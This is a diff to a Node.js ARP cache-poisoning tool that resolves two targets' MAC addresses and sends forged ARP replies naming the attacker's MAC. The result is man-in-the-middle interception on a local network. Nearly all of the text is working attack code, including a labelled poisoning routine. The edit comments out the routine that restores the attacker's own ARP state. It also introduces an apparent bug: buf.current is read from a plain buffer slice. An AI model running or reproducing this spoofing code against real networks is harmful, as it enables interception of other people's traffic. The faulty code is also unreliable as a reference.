@@ -34,19 +34,19 @@ getmac(function(err, macAddr) {
   var target1_mac, target2_mac, response;
   attacker.mac = macAddr;
 
-  arpRequest(target1, (nbytes, buf, close) => {
+  arpRequest(target1, (buf, close) => {
     var response = createARPPacket(buf);
     if(response.arp.operation.readInt16BE(0) !== OPERATION.REPLY) {
       return;
     }
 
-    target1.mac = buf2macString(response.arp.src_mac);
+    target1.mac = buf2macString(response.arp.sender_mac);
     close();
     console.log("MAC found for target 1:\t", target1.mac);
 
-    arpRequest(target2, (nbytes, buf, close) => {
-      response = createARPPacket(buf);
-      target2.mac = buf2macString(response.arp.src_mac);
+    arpRequest(target2, (buf, close) => {
+      response = createARPPacket(buf.current);
+      target2.mac = buf2macString(response.arp.sender_mac);
       close();
       console.log("MAC found for target 2:\t", target2.mac);
       // Poisoning example
@@ -79,28 +79,28 @@ var spoof = function (src, dst, mac) {
 
   packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);
 
-  setMac(packet.arp.dst_mac, "FF-FF-FF-FF-FF-FF");
-  setMac(packet.eth.dst_mac, "FF-FF-FF-FF-FF-FF");
+  setMac(packet.arp.target_mac, dst.mac);
+  setMac(packet.eth.target_mac, dst.mac);
 
-  setMac(packet.arp.src_mac, mac);
-  setMac(packet.eth.src_mac, mac);
+  setMac(packet.arp.sender_mac, mac);
+  setMac(packet.eth.sender_mac, mac);
 
-  setIP(packet.arp.src_ip, src.ip);
-  setIP(packet.arp.dst_ip, dst.ip);
+  setIP(packet.arp.sender_ip, src.ip);
+  setIP(packet.arp.target_ip, dst.ip);
 
   send(packet.buffer);
 
 
   // Fix our own ARP stack
-  setMac(packet.arp.dst_mac, attacker.mac);
-  setMac(packet.eth.dst_mac, attacker.mac);
-  setIP(packet.arp.dst_ip, attacker.ip);
+  /*setMac(packet.arp.target_mac, attacker.mac);
+  setMac(packet.eth.target_mac, attacker.mac);
+  setIP(packet.arp.target_ip, attacker.ip);
 
-  setMac(packet.eth.src_mac, dst.mac);
-  setMac(packet.arp.src_mac, dst.mac);
-  setIP(packet.arp.src_ip, dst.ip);
+  setMac(packet.eth.sender_mac, dst.mac);
+  setMac(packet.arp.sender_mac, dst.mac);
+  setIP(packet.arp.sender_ip, dst.ip);
 
-  send(packet.buffer);
+  send(packet.buffer);*/
 };
 
 var arpRequest = function(target, callback) {
@@ -109,21 +109,21 @@ var arpRequest = function(target, callback) {
 
   packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);
 
-  packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);
-  packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);
+  packet.arp.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
+  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
 
-  setMac(packet.eth.src_mac, attacker.mac);
-  setMac(packet.arp.src_mac, attacker.mac);
+  setMac(packet.eth.sender_mac, attacker.mac);
+  setMac(packet.arp.sender_mac, attacker.mac);
 
-  setIP(packet.arp.src_ip, attacker.ip);
-  setIP(packet.arp.dst_ip, target.ip);
+  setIP(packet.arp.sender_ip, attacker.ip);
+  setIP(packet.arp.target_ip, target.ip);
 
   c.open(device, filter, bufSize, socketBuffer);
   c.setMinBytes(42); // Length of an ARP packet
   console.log("\n\nSending ARP Request for ", target.ip);
   c.send(packet.buffer, packet.buffer.length);
   c.on("packet", (nbytes) => {
-    callback(nbytes, socketBuffer, () => { c.close(); });
+    callback(socketBuffer.slice(0,nbytes), () => { c.close(); });
   });
 };
 
@@ -179,8 +179,8 @@ var createARPPacket = function(buf) {
 
   var packet = {
     eth: {
-      dst_mac: buffer.slice(0,6),
-      src_mac: buffer.slice(6,12),
+      target_mac: buffer.slice(0,6),
+      sender_mac: buffer.slice(6,12),
       ethertype: buffer.slice(12,14)
     },
     arp: {
@@ -188,10 +188,10 @@ var createARPPacket = function(buf) {
       protocol: buffer.slice(16,18),
       hardwareAddressLen: buffer.slice(18,20),
       operation: buffer.slice(20,22),
-      src_mac: buffer.slice(22,28),
-      src_ip: buffer.slice(28,32),
-      dst_mac: buffer.slice(32,38),
-      dst_ip: buffer.slice(38,42)
+      sender_mac: buffer.slice(22,28),
+      sender_ip: buffer.slice(28,32),
+      target_mac: buffer.slice(32,38),
+      target_ip: buffer.slice(38,42)
     }
   };
 
